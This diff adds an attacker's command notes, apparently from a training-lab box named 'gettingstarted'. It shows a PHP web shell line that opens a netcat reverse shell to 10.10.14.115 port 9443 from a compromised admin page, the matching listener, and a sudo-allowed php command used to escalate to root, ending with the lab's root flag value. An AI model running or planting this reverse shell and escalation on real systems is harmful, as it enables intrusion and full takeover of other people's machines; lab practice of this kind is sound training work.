@@ -1,0 +1,36 @@
+List of commands
+
+// Command I used to create a reverse shell after getting into the admin page and implementing this line of code in the php code
+
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.115 9443 >/tmp/f') ?>
+
+// Used port 9443 to have the target connect to my attack machine
+
+nc -lvnmp 9443
+
+// This is when I had check sudo privelages after exploiting and getting a foothold
+
+www-data@gettingstarted:/home/mrb3n$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+
+www-data@gettingstarted:/home/mrb3n$ sudo php -r 'system(/bin/bash);'
+sudo php -r 'system(/bin/bash);'
+
+root@gettingstarted:/home/mrb3n# whoami
+whoami
+root
+root@gettingstarted:/home/mrb3n# cd /root
+cd /root
+root@gettingstarted:~# ls
+ls
+root.txt
+snap
+root@gettingstarted:~# cat root.txt
+cat root.txt
+f1fba6e9f71efb2630e6e34da6387842
